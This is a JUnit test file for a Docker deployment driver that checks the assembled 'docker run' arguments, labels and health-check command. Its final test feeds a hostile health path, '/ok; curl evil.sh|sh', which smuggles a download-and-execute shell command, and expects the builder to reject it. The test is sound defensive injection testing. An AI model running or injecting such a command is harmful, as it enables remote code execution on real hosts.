package eu.wohlben.qits.cd.dockerhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.cd.control.DeploymentDriver;
import eu.wohlben.qits.cd.error.BadRequestException;
import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker run} argv as assembled — plain JUnit over the package-private builder, the
 * {@code CiDaemonLauncherTest} stance: the argv IS the contract with the docker CLI, and asserting
 * it needs no docker.
 */
class DockerDeploymentDriverTest {

  private DockerDeploymentDriver driver() {
    DockerDeploymentDriver driver = new DockerDeploymentDriver();
    driver.runtime = "docker";
    driver.pullTimeoutSeconds = 600;
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.outputMaxChars = 65536;
    return driver;
  }

  private DeploymentDriver.StartSpec spec(String healthPath) {
    return new DeploymentDriver.StartSpec(
        "env-id",
        "some-epic",
        "app-id",
        "qits-gateway",
        "dep-id",
        "qits-env-some-epic",
        "qits-artifacts:8080/qits/qits-gateway:abc1234",
        "qits-cd-some-epic-qits-gateway-dep",
        healthPath);
  }

  @Test
  void theArgvCarriesNetworkAliasLabelsHealthGateAndRestartPolicy() {
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertEquals(List.of("docker", "run", "-d"), argv.subList(0, 3));
    assertTrue(argv.containsAll(List.of("--network", "qits-env-some-epic")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-gateway")));
    assertTrue(argv.containsAll(List.of("--restart", "unless-stopped")));
    assertTrue(argv.contains("qits.cd.environment=env-id"));
    assertTrue(argv.contains("qits.cd.application=app-id"));
    assertTrue(argv.contains("qits.cd.deployment=dep-id"));
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    assertTrue(argv.contains("QITS_ENVIRONMENT=some-epic"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // Belt on top of the boundary's braces: the one value interpolated into a string a shell will
    // run is re-validated at the last line before the argv.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/ok; curl evil.sh|sh")));
  }
}
